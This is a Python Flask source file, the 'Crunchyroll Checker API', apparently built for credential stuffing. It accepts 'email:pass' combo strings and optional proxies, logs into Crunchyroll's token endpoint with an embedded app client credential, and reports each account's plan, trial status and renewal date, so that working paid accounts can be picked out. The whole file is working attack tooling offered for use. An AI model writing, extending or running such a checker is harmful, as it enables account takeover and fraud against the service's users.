from flask import Flask, request, jsonify
import requests
from urllib.parse import quote
from datetime import datetime
import pytz
import json

app = Flask(__name__)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36"

def format_proxy(proxy_string):
    if not proxy_string:
        return None
    if "@" in proxy_string:
        if not proxy_string.startswith("http"):
            proxy_string = "http://" + proxy_string
        return {"http": proxy_string, "https": proxy_string}
    parts = proxy_string.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        pstr = f"http://{user}:{pwd}@{ip}:{port}"
        return {"http": pstr, "https": pstr}
    elif len(parts) == 2:
        ip, port = parts
        pstr = f"http://{ip}:{port}"
        return {"http": pstr, "https": pstr}
    return None

def curl_request(url, headers=None, post=None, proxy=None, timeout=25):
    session = requests.Session()
    proxies = format_proxy(proxy) if proxy else None
    try:
        if post is not None:
            res = session.post(url, headers=headers, data=post, proxies=proxies, timeout=timeout)
        else:
            res = session.get(url, headers=headers, proxies=proxies, timeout=timeout)
        return res.text, res.status_code, None
    except Exception as e:
        return None, None, str(e)

def get_access_token(email, password, proxy=None):
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    headers = {
        "User-Agent": "Crunchyroll/3.78.3 Android/9 okhttp/4.12.0",
        "Authorization": "Basic bWZsbzhqeHF1cTFxeWJwdmY3cXA6VEFlTU9SRDBGRFhpdGMtd0l6TVVfWmJORVRRT2pXWXg=",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = f"username={quote(email)}&password={quote(password)}&grant_type=password&scope=offline_access&device_id=14427c33-1893-4bc5-aaf3-dea072be2831&device_type=Chrome%20on%20Android"

    res_text, status, err = curl_request(url, headers=headers, post=data, proxy=proxy)
    if err:
        return None, f"Curl Error: {err}", None

    try:
        json_res = json.loads(res_text)
    except Exception:
        json_res = None

    if not json_res or json_res.get("error"):
        return None, f"Invalid Credentials or Error: {json_res}", None

    token = json_res.get("access_token")
    if not token:
        return None, "No access token received.", None

    return token, None, json_res

def fetch_account_details(token, proxy=None):
    headers = {
        "User-Agent": UA,
        "Authorization": f"Bearer {token}",
        "Accept": "application/json, text/plain, */*",
        "Referer": "https://www.crunchyroll.com/account/membership"
    }

    me_text, me_status, me_err = curl_request("https://www.crunchyroll.com/accounts/v1/me", headers=headers, proxy=proxy)
    if me_err:
        return None, f"Error fetching account info: {me_err}", None

    try:
        me_json = json.loads(me_text)
    except Exception:
        me_json = None

    if not me_json or "account_id" not in me_json:
        return None, "No account_id found", me_text

    account_id = me_json["account_id"]

    subs_url = f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions"
    subs_text, subs_status, subs_err = curl_request(subs_url, headers=headers, proxy=proxy)
    if subs_err:
        return None, f"Error fetching subscriptions: {subs_err}", None

    try:
        subs_json = json.loads(subs_text)
    except Exception:
        subs_json = None

    if not subs_json:
        return None, "Failed to fetch subscriptions", subs_text

    # Free account check
    if subs_json.get("containerType") == "free":
        return {
            "account_id": account_id,
            "plan": "Free",
            "status": "free",
            "trial": False,
            "renewal": "N/A",
            "days_left": "N/A"
        }, None, subs_json

    subs_list = subs_json.get("subscriptions", [])
    if subs_list:
        sub = subs_list[0]
        plan = sub.get("plan", {}).get("tier", {}).get("text") or sub.get("plan", {}).get("name", {}).get("text") or "N/A"
        status = sub.get("status", "N/A")
        trial = sub.get("activeFreeTrial", False)
        next_renewal = sub.get("nextRenewalDate", "N/A")

        days_left = "N/A"
        if next_renewal not in ["N/A", None]:
            try:
                renewal_dt = datetime.strptime(next_renewal, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=pytz.UTC)
                ist = pytz.timezone("Asia/Kolkata")
                now = datetime.now(ist)
                days_left = max(0, (renewal_dt.astimezone(ist) - now).days)
            except Exception:
                pass

        return {
            "account_id": account_id,
            "plan": plan,
            "status": status,
            "trial": trial,
            "renewal": next_renewal,
            "days_left": days_left
        }, None, subs_json

    return {
        "account_id": account_id,
        "plan": "Unknown",
        "status": "Unknown",
        "trial": False,
        "renewal": "N/A",
        "days_left": "N/A"
    }, None, subs_json

@app.route("/check", methods=["GET", "POST"])
def check():
    combo = request.values.get("email", "").strip()
    proxy = request.values.get("proxy", "")

    if not combo or ":" not in combo:
        return jsonify({"error": "Use ?email=email:pass&proxy=proxy"}), 400

    email, password = combo.split(":", 1)

    token, err, _ = get_access_token(email, password, proxy)
    if not token:
        return jsonify({"account": f"{email}:{password}", "error": err}), 200

    details, err, _ = fetch_account_details(token, proxy)
    if not details:
        return jsonify({"account": f"{email}:{password}", "error": err}), 200

    response = {
        "account": f"{email}:{password}",
        "account_id": details["account_id"],
        "plan": details["plan"],
        "status": details["status"],
        "trial": details["trial"],
        "next_renewal": details["renewal"],
        "days_left": details["days_left"]
    }
    return jsonify(response), 200

@app.route("/")
def home():
    return jsonify({
        "message": "Crunchyroll Checker API",
        "usage": "/check?email=email:pass&proxy=proxy (proxy optional)"
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)
